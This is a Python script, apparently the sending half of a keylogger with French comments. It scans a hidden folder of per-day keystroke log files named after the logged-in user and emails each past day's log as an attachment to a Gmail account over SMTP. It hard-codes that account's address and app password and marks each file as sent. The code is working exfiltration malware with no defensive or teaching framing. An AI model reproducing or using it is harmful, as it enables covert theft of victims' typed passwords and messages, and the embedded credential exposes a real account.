import os
import datetime
import time

NOM_DOSSIER_SECRET = "C:/data_key_screen"
dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
datehier = (datetime.datetime.now()++ datetime.timedelta(days=-1)).strftime('%Y-%m-%d')
dateheure = datetime.datetime.now().strftime('%H:%M:%S')
username = os.getlogin()


import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def email_alert(subject,body,to, liste_file=""):
    msg = MIMEMultipart()
    
    msg['subject'] = subject
    msg['to'] = to
    user = "KeyLoggerVeski@gmail.com"
    
    msg['from'] = user
    password = "sslezqomykvdhggd"
    
    msg.attach(MIMEText(body,'plain'))
    
    for filename in liste_file:
        if os.path.exists(filename):
            attachment = open(filename,"rb")
            part = MIMEBase('application','octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition','attachment; filename=' + filename)
            msg.attach(part)
        else:
            print(filename + " : file not exist")
        
        
    
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(user,password)
    server.send_message(msg)
    
    print("###" + subject + " ok the mail send to KeyLoggerVeski@gmail.com")
    server.quit()



def send_log_dossier(NOM_DOSSIER_SECRET,dateee):
	global dateheure
	
	dossierhier = NOM_DOSSIER_SECRET+"/"+dateee #le dossier
	nomfile_hier = username + " touch " + dateee + ".txt" #le fichier log
	if os.path.exists(dossierhier):
		
		if not os.path.exists(dossierhier +"/ok_sent.txt"):
			listefichiers = [f"{dossierhier}/{nomfile_hier}"]
							
			email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
			
			#ok c'est fait, c'est noté
			fichierok = open(dossierhier+"/ok_sent.txt", "a")
			fichierok.write(f"{dossierhier}/{nomfile_hier} file sent at {dateheure},to KeyLoggerVeski@gmail.com \n")
			fichierok.close()
			print("## " + dossierhier+"/ok_sent.txt")
		else:
			print(" * " + nomfile_hier + " DEJA ENVOYER CHKAL")

print(os.listdir(NOM_DOSSIER_SECRET))
for dos in os.listdir(NOM_DOSSIER_SECRET):
	if dos != dateajd:
		send_log_dossier(NOM_DOSSIER_SECRET,dos)
	else:
		print(f" * dont sent dir of today {dateajd}")				

staller = input("Press ENTER to close")
